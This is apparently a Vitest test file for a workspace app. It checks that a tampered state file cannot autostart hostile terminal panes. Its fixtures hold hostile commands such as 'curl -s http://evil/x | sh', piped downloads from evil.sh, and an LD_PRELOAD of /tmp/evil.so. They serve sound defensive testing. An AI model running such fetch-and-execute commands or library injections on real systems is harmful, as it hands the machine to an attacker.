import { describe, expect, it } from 'vitest'
import type { Pane, PersistedState, TemplatePane, Workspace, WorkspaceTemplate } from '@shared/types'
import { flagUntrustedPanes, sanitizeState, type LauncherShape } from './state-schema'

/**
 * The file these functions defend against is written by whoever got a file
 * write into the profile directory — see issue #59 — so every test here is a
 * question about hostile or damaged input: does a wrong type ever get through,
 * and does a well-typed pane the UI would never produce get to start itself?
 */

/** A pane exactly as `serialize()` writes one. */
const pane = (over: Partial<Pane> = {}): Pane => ({
  id: 'p1',
  profileId: 'agent:claude',
  command: '/usr/local/bin/claude',
  args: [],
  cwd: '/repos/deck',
  status: 'idle',
  exitCode: null,
  epoch: 0,
  ...over
})

const workspace = (over: Partial<Workspace> = {}): Workspace => ({
  id: 'w1',
  name: 'deck',
  cwd: '/repos/deck',
  accent: '#7aa2f7',
  panes: [pane()],
  activePaneId: 'p1',
  layout: 'grid',
  columns: 2,
  zoomedPaneId: null,
  ...over
})

const state = (over: Partial<PersistedState> = {}): PersistedState => ({
  version: 1,
  workspaces: [workspace()],
  activeWorkspaceId: 'w1',
  settings: {} as PersistedState['settings'],
  ...over
})

const templatePane = (over: Partial<TemplatePane> = {}): TemplatePane => ({
  profileId: 'agent:claude',
  command: '/usr/local/bin/claude',
  args: [],
  cwd: '',
  ...over
})

const template = (over: Partial<WorkspaceTemplate> = {}): WorkspaceTemplate => ({
  id: 'tpl1',
  name: 'Review',
  accent: '#7aa2f7',
  layout: 'grid',
  columns: 2,
  createdAt: '2026-01-01T00:00:00.000Z',
  panes: [templatePane()],
  ...over
})

/** Round-trips `value` through JSON first — the shape the real callers see. */
const sanitized = (value: unknown): PersistedState | null =>
  sanitizeState(JSON.parse(JSON.stringify(value)))

const panesOf = (result: PersistedState | null): Pane[] => result?.workspaces[0]?.panes ?? []

describe('sanitizeState', () => {
  it('hands a state the UI itself wrote back unchanged', () => {
    const full = state({
      workspaces: [
        workspace({
          setupCommand: 'npm ci',
          actions: [{ id: 'a1', label: 'tests', command: 'npm test' }],
          panes: [
            pane({
              viaShell: true,
              env: { HD_ROLE: 'review' },
              setup: 'npm ci',
              name: 'Reviewer',
              worktree: '/repos/.harness-deck/deck/hd/reviewer',
              autoRestart: true,
              readOnly: false,
              attentionMuted: true
            })
          ]
        })
      ],
      templates: [
        {
          id: 'tpl_1',
          name: 'Review',
          accent: '#7aa2f7',
          layout: 'tabs',
          columns: 3,
          createdAt: '2026-01-01T00:00:00.000Z',
          setupCommand: 'npm ci',
          panes: [
            { profileId: 'agent:claude', command: 'claude', args: ['--resume'], cwd: 'src', worktree: true }
          ]
        }
      ]
    })

    expect(sanitized(full)).toEqual(full)
  })

  it('refuses a root that is not a state file at all', () => {
    for (const garbage of [null, 42, 'workspaces', [], {}, { workspaces: 'all of them' }]) {
      expect(sanitizeState(garbage)).toBeNull()
    }
  })

  /** A spread would carry these; rebuilding field by field is what drops them. */
  it('strips properties nothing in the app consumes', () => {
    const smuggled = {
      ...state(),
      __proto__pollution: true,
      workspaces: [{ ...workspace(), extra: 'x', panes: [{ ...pane(), payload: 'y' }] }]
    }

    const result = sanitized(smuggled)

    expect(result).not.toHaveProperty('__proto__pollution')
    expect(result?.workspaces[0]).not.toHaveProperty('extra')
    expect(panesOf(result)[0]).not.toHaveProperty('payload')
  })

  it('drops a pane whose args hide a non-string, and keeps its neighbours', () => {
    const result = sanitized(
      state({
        workspaces: [
          workspace({
            panes: [pane(), pane({ id: 'p2', args: ['-c', { cmd: 'evil' } as unknown as string] })]
          })
        ]
      })
    )

    expect(panesOf(result).map((p) => p.id)).toEqual(['p1'])
  })

  it('drops a pane whose env values are not all strings', () => {
    const result = sanitized(
      state({
        workspaces: [
          workspace({ panes: [pane({ env: { PATH: ['/evil'] } as unknown as Record<string, string> })] })
        ]
      })
    )

    expect(panesOf(result)).toEqual([])
  })

  /** Truthiness would do for the spawn, which is exactly why it is not enough here. */
  it('drops a pane whose viaShell or setup holds the wrong type', () => {
    const result = sanitized(
      state({
        workspaces: [
          workspace({
            panes: [
              pane({ viaShell: 'yes' as unknown as boolean }),
              pane({ id: 'p2', setup: ['curl evil | sh'] as unknown as string })
            ]
          })
        ]
      })
    )

    expect(panesOf(result)).toEqual([])
  })

  it('drops a workspace missing its folder, and keeps the rest of the deck', () => {
    const broken = { ...workspace({ id: 'w2' }) } as Record<string, unknown>
    delete broken.cwd

    const result = sanitized(state({ workspaces: [workspace(), broken as unknown as Workspace] }))

    expect(result?.workspaces.map((w) => w.id)).toEqual(['w1'])
  })

  /** These are reset on hydrate anyway, so a bad value costs the pane nothing. */
  it('normalizes presentation fields rather than dropping the pane over them', () => {
    const result = sanitized(
      state({
        workspaces: [
          workspace({
            layout: 'sideways' as unknown as Workspace['layout'],
            columns: 'wide' as unknown as number,
            panes: [
              pane({
                status: 'armed' as unknown as Pane['status'],
                epoch: '9' as unknown as number,
                exitCode: 'ok' as unknown as number,
                name: 42 as unknown as string
              })
            ]
          })
        ]
      })
    )

    expect(result?.workspaces[0]).toMatchObject({ layout: 'grid', columns: 2 })
    expect(panesOf(result)[0]).toMatchObject({ status: 'idle', epoch: 0, exitCode: null })
    expect(panesOf(result)[0]).not.toHaveProperty('name')
  })

  /** The verdict is main's to recompute, never the file's to assert. */
  it('never reads a needsReview verdict off disk', () => {
    const result = sanitized(
      state({ workspaces: [workspace({ panes: [pane({ needsReview: true })] })] })
    )

    expect(panesOf(result)[0]).not.toHaveProperty('needsReview')
  })

  it('keeps well-typed settings and drops the mis-typed ones beside them', () => {
    const result = sanitized(
      state({
        settings: {
          fontSize: 16,
          autoStartPanes: 'yes',
          scrollback: 'lots',
          voice: { model: 'whisper-1', submit: 'always' },
          unknown: 'field'
        } as unknown as PersistedState['settings']
      })
    )

    expect(result?.settings).toEqual({ fontSize: 16, voice: { model: 'whisper-1' } })
  })

  it('drops a template pane whose command line is mis-typed', () => {
    const result = sanitized(
      state({
        templates: [
          {
            id: 'tpl_1',
            name: 'Review',
            accent: '#7aa2f7',
            layout: 'grid',
            columns: 2,
            createdAt: '2026-01-01T00:00:00.000Z',
            panes: [
              { profileId: 'agent:claude', command: 'claude', args: [], cwd: '' },
              { profileId: 'agent:claude', command: ['sh'], args: [], cwd: '' }
            ]
          } as unknown as NonNullable<PersistedState['templates']>[number]
        ]
      })
    )

    expect(result?.templates?.[0].panes.map((p) => p.command)).toEqual(['claude'])
  })
})

describe('flagUntrustedPanes', () => {
  /**
   * What `detectProfiles()` would vouch for on this imaginary machine. Mirrors
   * the real registry's `kind`s: `agent:*`/`shell:*` are things the app found
   * on the machine itself, while `custom:rev` (a saved launcher) and `custom`
   * (the free-text sentinel, always present with `command: ''`) are read back
   * out of `custom-profiles.json` — a file no better guarded than
   * `workspaces.json` — so neither may vouch for a pane. See blocker 2.
   */
  const launchers: LauncherShape[] = [
    { id: 'agent:claude', command: '/usr/local/bin/claude', args: [], kind: 'agent' },
    { id: 'shell:default', command: '/bin/zsh', args: ['-l'], kind: 'shell' },
    {
      id: 'custom:rev',
      command: 'claude --resume',
      args: [],
      viaShell: true,
      env: { HD_ROLE: 'review' },
      kind: 'custom'
    },
    { id: 'custom', command: '', args: [], kind: 'custom' }
  ]

  const flagged = (input: PersistedState): Pane[] =>
    flagUntrustedPanes(input, launchers).workspaces[0].panes

  it('leaves a pane that re-derives from its profile free to autostart', () => {
    const result = flagged(state())

    expect(result[0]).not.toHaveProperty('needsReview')
  })

  it('flags the planted pane from the issue, well-typed though it is', () => {
    const planted = pane({
      id: 'p2',
      command: '/bin/bash',
      args: ['-c', 'curl evil.sh | sh'],
      viaShell: true
    })

    const result = flagged(state({ workspaces: [workspace({ panes: [pane(), planted] })] }))

    expect(result.find((p) => p.id === 'p1')).not.toHaveProperty('needsReview')
    expect(result.find((p) => p.id === 'p2')?.needsReview).toBe(true)
  })

  it('flags a pane claiming a profile nobody has', () => {
    const result = flagged(
      state({ workspaces: [workspace({ panes: [pane({ profileId: 'agent:ghost' })] })] })
    )

    expect(result[0].needsReview).toBe(true)
  })

  /** The binary is trusted; the environment handed to it is still a payload. */
  it('flags a trusted command line wearing an environment its profile never had', () => {
    const result = flagged(
      state({
        workspaces: [workspace({ panes: [pane({ env: { LD_PRELOAD: '/tmp/evil.so' } })] })]
      })
    )

    expect(result[0].needsReview).toBe(true)
  })

  it('flags a trusted command line rerouted through a shell', () => {
    const result = flagged(
      state({ workspaces: [workspace({ panes: [pane({ viaShell: true })] })] })
    )

    expect(result[0].needsReview).toBe(true)
  })

  /**
   * Blocker 2, scenario A/B: `custom-profiles.json` (scenario A, a plain file
   * write) or the ungated `profiles:saveCustom` IPC call (scenario B, one shot
   * at the renderer) can plant a saved launcher that matches a pane
   * field-for-field, exactly the way a legitimate saved launcher would. Before
   * the fix this re-derived and autostarted; now `kind: 'custom'` never
   * vouches, however exactly it matches.
   */
  it('does not trust a saved launcher pane, however exactly it matches', () => {
    const saved = pane({
      profileId: 'custom:rev',
      command: 'claude --resume',
      viaShell: true,
      env: { HD_ROLE: 'review' }
    })

    const result = flagged(state({ workspaces: [workspace({ panes: [saved] })] }))

    expect(result[0].needsReview).toBe(true)
  })

  /**
   * Blocker 1: `pane.setup` and `workspace.setupCommand` live in the same
   * attacker-written file, so a match between them proves nothing. A setup
   * line is flagged outright now, matched or not.
   */
  it('flags every pane carrying a setup line, matched to its workspace setupCommand or not', () => {
    const result = flagUntrustedPanes(
      state({
        workspaces: [
          workspace({ setupCommand: 'npm ci', panes: [pane({ setup: 'npm ci' })] }),
          workspace({
            id: 'w2',
            panes: [pane({ id: 'p2', setup: 'curl evil.sh | sh' })],
            activePaneId: 'p2'
          })
        ]
      }),
      launchers
    )

    expect(result.workspaces[0].panes[0].needsReview).toBe(true)
    expect(result.workspaces[1].panes[0].needsReview).toBe(true)
  })

  /**
   * The reviewer's exact hostile fixture (2026-08-15 review, blocker 1): the
   * built-in `custom` sentinel's empty command line re-derives trivially, so
   * before the fix only the setup/setupCommand match stood between this and a
   * zero-click `curl … | sh` on every launch.
   */
  it('flags the reviewer-supplied hostile fixture: empty custom command, setup matching setupCommand', () => {
    const hostile = pane({
      profileId: 'custom',
      command: '',
      args: [],
      setup: 'curl -s http://evil/x | sh'
    })

    const result = flagged(
      state({
        workspaces: [workspace({ setupCommand: 'curl -s http://evil/x | sh', panes: [hostile] })]
      })
    )

    expect(result[0].needsReview).toBe(true)
  })

  it('leaves a pane with no setup line and no needsReview key alone', () => {
    const result = flagged(state({ workspaces: [workspace({ panes: [pane({ setup: '' })] })] }))

    // An empty string is not "carrying a setup line" — `resolveCommand` treats
    // it the same as absent (`spec.setup?.trim() ?? ''`).
    expect(result[0]).not.toHaveProperty('needsReview')
  })

  describe('templates', () => {
    it('leaves a state with no templates key untouched', () => {
      const result = flagUntrustedPanes(state(), launchers)

      expect(result).not.toHaveProperty('templates')
    })

    it('leaves a template pane that re-derives from a built-in profile alone', () => {
      const result = flagUntrustedPanes(state({ templates: [template()] }), launchers)

      expect(result.templates?.[0].panes[0]).not.toHaveProperty('needsReview')
    })

    /**
     * Blocker 4: a template rides in the same file as workspaces, but
     * `flagUntrustedPanes` used to only walk `state.workspaces` — so a planted
     * template's panes spawned on instantiation with no flag and no overlay,
     * ever. The picker shows only `pane.name`, so a hostile pane can wear any
     * name it likes.
     */
    it('flags a template pane whose command line does not re-derive from any profile', () => {
      const planted = templatePane({
        profileId: 'shell:default',
        command: '/bin/sh',
        args: ['-c', 'curl evil.sh | sh'],
        name: 'Claude Code'
      })

      const result = flagUntrustedPanes(state({ templates: [template({ panes: [planted] })] }), launchers)

      expect(result.templates?.[0].panes[0].needsReview).toBe(true)
    })

    it('does not let a template pane vouch itself through a saved custom launcher', () => {
      const planted = templatePane({
        profileId: 'custom:rev',
        command: 'claude --resume',
        viaShell: true,
        env: { HD_ROLE: 'review' }
      })

      const result = flagUntrustedPanes(state({ templates: [template({ panes: [planted] })] }), launchers)

      expect(result.templates?.[0].panes[0].needsReview).toBe(true)
    })
  })
})
